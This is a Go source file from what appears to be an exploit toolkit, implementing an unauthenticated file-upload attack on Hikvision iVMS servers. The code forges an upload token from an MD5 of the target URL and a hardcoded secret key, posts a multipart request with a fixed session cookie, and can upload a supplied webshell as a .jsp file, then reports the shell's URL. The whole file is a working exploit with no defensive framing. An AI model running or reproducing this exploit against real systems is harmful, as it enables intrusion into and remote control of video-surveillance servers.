package hikvision

import (
	"Exploit/common"
	"crypto/md5"
	"encoding/hex"
	"github.com/projectdiscovery/gologger"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

func Md5(str string) string {
	hash := md5.New()

	// 将字符串转换为字节数组并写入哈希对象
	hash.Write([]byte(str))

	// 计算哈希值
	hashValue := hash.Sum(nil)

	// 将哈希值转换为十六进制字符串
	hashString := hex.EncodeToString(hashValue)

	// 转换为大写形式
	hashString = strings.ToUpper(hashString)
	return hashString
}
func Hikvision_ivms_upload2(options *common.Options) {
	exp_path := "/eps/api/resourceOperations/upload?token="
	exp_body_str := (`--67d9f3ed7170fb5e4b9e8b2e48a72653
Content-Disposition: form-data; name="fileUploader"; filename="configs.txt"
Content-Type: images/jpeg

1
--67d9f3ed7170fb5e4b9e8b2e48a72653--`)
	if options.Webshell != "" {
		exp_body_str = (`--67d9f3ed7170fb5e4b9e8b2e48a72653
Content-Disposition: form-data; name="fileUploader"; filename="configs.jsp"
Content-Type: images/jpeg

332299402
--67d9f3ed7170fb5e4b9e8b2e48a72653--`)

		exp_body_str = strings.ReplaceAll(exp_body_str, "332299402", common.ReadWebshell(options.Webshell))
	}
	exp_body_str = strings.ReplaceAll(exp_body_str, "\n", "\r\n")
	exp_body := strings.NewReader(exp_body_str)
	md5str := Md5(options.Url + "/eps/api/resourceOperations/uploadsecretKeyIbuilding")

	client, err := common.InitHttpClient(options.Proxy)
	if err != nil {
		gologger.Warning().Msgf("HTTP方法初始化失败")
	}
	req, _ := http.NewRequest("POST", options.Url+exp_path+md5str, exp_body)
	req.Header.Set("Cookie", "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169")
	req.Header.Set("Content-Type", "multipart/form-data; boundary=67d9f3ed7170fb5e4b9e8b2e48a72653")
	req.Header.Set("Accept", "*/*")
	resp, err := (client).Do(req)
	defer resp.Body.Close()
	rst, _ := ioutil.ReadAll(resp.Body)
	if resp.StatusCode == 200 && strings.Contains(string(rst), "上传附件成功") {
		match := regexp.MustCompile(`"resourceUuid":"([a-fA-F0-9]+)"`).FindStringSubmatch(string(rst))
		gologger.Print().Msgf("[+] %s 存在 Hikvision_ivms_upload2 漏洞,访问地址为%s/eps/upload/%s.jsp", options.Url, options.Url, match[1])
	}
}
